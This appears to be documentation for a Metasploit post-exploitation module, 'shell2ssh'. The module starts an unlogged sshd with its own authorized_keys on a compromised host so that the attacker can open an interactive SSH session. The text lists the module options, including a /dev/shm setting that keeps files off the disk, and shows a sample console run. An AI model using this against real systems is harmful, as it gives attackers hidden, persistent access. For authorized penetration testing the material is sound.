This module starts a ssh server with a custom configuration whithout logging and custom path for ssh authorized_keys. This is used for logging in into this ssh server for creating another ssh session (including tty support, etc).

## Module Options

**LHOST**

IP of ssh server to connect to. If not defined IP is taken from metasploit session

**SSHD_PATH**

Full path of the sshd binary. If not definded a (short) list of typical installations is checked which usually finds the binary.

**SSHD_PORT**

Port number the SSH Server should listen. Default is 2222

**USERNAME**

The username for logging into the ssh server. If not definded `whoami` is executed and used as username.

**WRITEDIR**

Path of a directory the current user has write permissions (by default /tmp will be used). On Linux often /dev/shm can be used for avoiding saving files to disk.

**SESSION**

Which session to use, which can be viewed with `sessions -l`

## Scenario
```
msf post(shell2ssh) > set SESSION 1
SESSION => 1
msf post(shell2ssh) > set VERBOSE true
VERBOSE => true
msf post(shell2ssh) > set LHOST 127.0.0.1
LHOST => 127.0.0.1
msf post(shell2ssh) > run

[*] Getting current username
[*] Getting writeable directory
[*] Getting path of sshd
[*] Generating SSH key
[+] SSH Key is stored in /home/user/.msf4/loot/20000001000607_default_1_ssh_key_843400.txt
[*] Generating SSHD config
[*] Uploading SSHD config
[*] Max line length is 4096
[*] Maximal line length: 4096
[*] Testing a command for echo: echo '00fffe414243447f25250a4546'|xxd -p -r
[*] Found a command for echo: echo '00fffe414243447f25250a4546'|xxd -p -r
[*] Writing 551 bytes in 1 chunks of 1102 bytes (bare_hex-encoded), using xxd
[*] Maximal line length: 4096
[*] already found a command for echo: echo 'CONTENTS'|xxd -p -r
[*] Writing 1675 bytes in 2 chunks of 2006 bytes (bare_hex-encoded), using xxd
[*] Next chunk is 1344 bytes
[*] Maximal line length: 4096
[*] already found a command for echo: echo 'CONTENTS'|xxd -p -r
[*] Writing 1228 bytes in 2 chunks of 2006 bytes (bare_hex-encoded), using xxd
[*] Next chunk is 450 bytes
[*] Maximal line length: 4096
[*] already found a command for echo: echo 'CONTENTS'|xxd -p -r
[*] Writing 380 bytes in 1 chunks of 760 bytes (bare_hex-encoded), using xxd
[*] Starting SSHD ("/usr/sbin/sshd -q -f  /dev/shm/cOtBBzVY")

[+] SSHd started
[+] SSHd running
[+] To login manually you run:
ssh -i /home/user/.msf4/loot/20000001000607_default_1_ssh_key_843400.txt  -p 2222 user@127.0.0.1 -o UserKnownHostsFile=/home/user/.msf4/loot/20000001000607_default_1_sshd_pub_462916.txt
__LOG default
[*] Logfile: /tmp/staekka_log_ssh_user@127.0.0.1:2222_587
[*] SSH Session session 2 opened (127.0.0.1 -> 127.0.0.1) at 2000-01-01 10:01:14 +0200
[*] Post module execution completed
msf post(shell2ssh) > sessions

Active sessions
===============

  Id  Type        Information  Connection
  --  ----        -----------  ----------
  1   shell unix  PTY:         local -> PTY: /bin/bash (::1)
  2   shell unix  SSH:         127.0.0.1 -> 127.0.0.1 ()

```
